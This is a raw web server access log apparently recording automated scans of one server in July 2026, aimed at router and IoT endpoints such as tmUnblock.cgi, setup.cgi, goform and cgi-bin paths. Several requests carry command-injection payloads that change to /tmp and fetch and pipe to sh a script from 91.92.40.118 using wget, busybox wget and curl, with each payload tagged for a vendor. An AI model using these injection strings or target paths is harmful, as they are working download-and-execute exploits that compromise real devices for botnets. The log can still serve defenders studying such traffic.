198.23.242.162 - - [10/Jul/2026:00:22:59 +0000] "GET /v2 HTTP/1.1" 401 105
94.154.43.254 - - [10/Jul/2026:01:20:16 +0000] "GET /login HTTP/1.1" 500 144
45.198.224.5 - - [10/Jul/2026:01:20:21 +0000] "POST /goform/set_LimitClient_cfg HTTP/1.1" 401 154
36.33.105.221 - - [10/Jul/2026:01:33:39 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 401 149
36.33.105.221 - - [10/Jul/2026:01:33:39 +0000] "-" 400 435
45.153.34.231 - - [10/Jul/2026:01:46:35 +0000] "POST /tmUnblock.cgi HTTP/1.1" 401 116
45.153.34.231 - - [10/Jul/2026:01:46:36 +0000] "POST /hndUnblock.cgi HTTP/1.1" 401 117
45.153.34.231 - - [10/Jul/2026:01:46:36 +0000] "GET /hndUnblock.cgi?ttcp_ip=-h%20%60cd%20/tmp%3Bwget%20http://91.92.40.118/wget.sh%20-O-%7Csh%20-s%20lhablk%3Bbusybox%20wget%20http://91.92.40.118/wget.sh%20-O-%7Csh%20-s%20lhablk%3Bcurl%20http://91.92.40.118/wget.sh%7Csh%20-s%20lhablk%60 HTTP/1.1" 401 117
45.153.34.231 - - [10/Jul/2026:01:46:36 +0000] "GET /tmUnblock.cgi?ttcp_ip=-h%20%60cd%20/tmp%3Bwget%20http://91.92.40.118/wget.sh%20-O-%7Csh%20-s%20lublk%3Bbusybox%20wget%20http://91.92.40.118/wget.sh%20-O-%7Csh%20-s%20lublk%3Bcurl%20http://91.92.40.118/wget.sh%7Csh%20-s%20lublk%60 HTTP/1.1" 401 116
45.153.34.231 - - [10/Jul/2026:01:46:36 +0000] "POST /tmUnblock.cgi HTTP/1.1" 401 116
45.153.34.231 - - [10/Jul/2026:01:46:36 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:37 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:37 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:37 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:37 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:38 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:38 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:38 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:38 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:38 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:39 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:39 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:39 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:39 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:39 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:40 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:40 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:40 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:40 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:40 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:41 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:41 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:41 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:41 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:42 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:42 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:42 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:42 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:42 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:43 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:43 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:43 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:43 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:43 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:44 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:44 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:44 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:44 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:45 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:45 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:45 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:45 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:45 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:46 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:46 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:46 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:46 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:46 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:47 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:47 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:47 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:47 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:47 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:48 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:48 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:48 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:48 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:49 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:49 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:49 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:49 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:49 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:50 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:50 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:50 +0000] "GET / HTTP/1.1" 401 103
45.153.34.231 - - [10/Jul/2026:01:46:50 +0000] "POST /apply.cgi HTTP/1.1" 401 112
45.153.34.231 - - [10/Jul/2026:01:46:50 +0000] "POST /JNAP/ HTTP/1.1" 401 108
45.153.34.231 - - [10/Jul/2026:01:46:51 +0000] "POST /JNAP/ HTTP/1.1" 401 108
45.153.34.231 - - [10/Jul/2026:01:46:51 +0000] "POST /JNAP/ HTTP/1.1" 401 108
45.153.34.231 - - [10/Jul/2026:01:46:51 +0000] "GET /sysinfo.cgi?action=;cd%20/tmp%3Bwget%20http://91.92.40.118/wget.sh%20-O-%7Csh%20-s%20lsysinfo%3Bbusybox%20wget%20http://91.92.40.118/wget.sh%20-O-%7Csh%20-s%20lsysinfo%3Bcurl%20http://91.92.40.118/wget.sh%7Csh%20-s%20lsysinfo HTTP/1.1" 401 114
45.153.34.231 - - [10/Jul/2026:01:46:51 +0000] "GET /setup.cgi?next_file=;cd%20/tmp%3Bwget%20http://91.92.40.118/wget.sh%20-O-%7Csh%20-s%20lsetup%3Bbusybox%20wget%20http://91.92.40.118/wget.sh%20-O-%7Csh%20-s%20lsetup%3Bcurl%20http://91.92.40.118/wget.sh%7Csh%20-s%20lsetup HTTP/1.1" 401 112
45.153.34.231 - - [10/Jul/2026:01:46:52 +0000] "POST /JNAP/ HTTP/1.1" 401 108
45.153.34.231 - - [10/Jul/2026:01:46:52 +0000] "GET /goform/setUsbUnload/.js?deviceName=A;cd%20/tmp%3Bwget%20http://91.92.40.118/wget.sh%20-O-%7Csh%20-s%20tenda%3Bbusybox%20wget%20http://91.92.40.118/wget.sh%20-O-%7Csh%20-s%20tenda%3Bcurl%20http://91.92.40.118/wget.sh%7Csh%20-s%20tenda HTTP/1.1" 401 126
45.153.34.231 - - [10/Jul/2026:01:46:52 +0000] "GET /config/?cmd=cd%20/tmp%3Bwget%20http://91.92.40.118/wget.sh%20-O-%7Csh%20-s%20dcs%3Bbusybox%20wget%20http://91.92.40.118/wget.sh%20-O-%7Csh%20-s%20dcs%3Bcurl%20http://91.92.40.118/wget.sh%7Csh%20-s%20dcs HTTP/1.1" 401 110
45.153.34.231 - - [10/Jul/2026:01:46:52 +0000] "GET null HTTP/1.1" 400 435
45.153.34.231 - - [10/Jul/2026:01:46:52 +0000] "POST /login.cgi HTTP/1.1" 401 112
45.153.34.231 - - [10/Jul/2026:01:46:53 +0000] "POST /diagnostic.php HTTP/1.1" 401 117
45.153.34.231 - - [10/Jul/2026:01:46:53 +0000] "GET /cgi-bin/masterCGI?ping=nomip&user=;cd%20/tmp%3Bwget%20http://91.92.40.118/wget.sh%20-O-%7Csh%20-s%20alcatel%3Bbusybox%20wget%20http://91.92.40.118/wget.sh%20-O-%7Csh%20-s%20alcatel%3Bcurl%20http://91.92.40.118/wget.sh%7Csh%20-s%20alcatel; HTTP/1.1" 401 120
45.153.34.231 - - [10/Jul/2026:01:46:53 +0000] "GET /cgi-bin/;cd null" 400 435
45.153.34.231 - - [10/Jul/2026:01:46:53 +0000] "GET null HTTP/1.1" 400 435
45.153.34.231 - - [10/Jul/2026:01:46:53 +0000] "GET null HTTP/1.1" 400 435
45.153.34.231 - - [10/Jul/2026:01:46:54 +0000] "GET null HTTP/1.1" 400 435
45.153.34.231 - - [10/Jul/2026:01:46:54 +0000] "POST /cgi-bin/supervisor/Factory.cgi HTTP/1.1" 401 133
45.153.34.231 - - [10/Jul/2026:01:46:54 +0000] "POST /goform/set_prohibiting HTTP/1.1" 401 125
45.153.34.231 - - [10/Jul/2026:01:46:54 +0000] "GET /capture_handle.action?captureCommand=;cd null" 400 435
45.153.34.231 - - [10/Jul/2026:01:46:55 +0000] "POST /goform/WriteFacMac HTTP/1.1" 401 121
45.153.34.231 - - [10/Jul/2026:01:46:55 +0000] "POST /cgi-bin/cstecgi.cgi HTTP/1.1" 401 122
45.153.34.231 - - [10/Jul/2026:01:46:55 +0000] "POST /cgi-bin/cstecgi.cgi HTTP/1.1" 401 122
45.153.34.231 - - [10/Jul/2026:01:46:55 +0000] "POST /cgi-bin/cstecgi.cgi HTTP/1.1" 401 122
45.153.34.231 - - [10/Jul/2026:01:46:55 +0000] "POST /cgi-bin/cstecgi.cgi HTTP/1.1" 401 122
45.153.34.231 - - [10/Jul/2026:01:46:56 +0000] "GET null HTTP/1.1" 400 435
45.153.34.231 - - [10/Jul/2026:01:46:56 +0000] "POST /cgi-bin/skk_set.cgi HTTP/1.1" 401 122
45.153.34.231 - - [10/Jul/2026:01:46:56 +0000] "POST /goform/PingTestSet HTTP/1.1" 401 121
45.153.34.231 - - [10/Jul/2026:01:46:56 +0000] "POST /en/9-2radius.php HTTP/1.1" 401 119
45.153.34.231 - - [10/Jul/2026:01:46:56 +0000] "GET null HTTP/1.1" 400 435
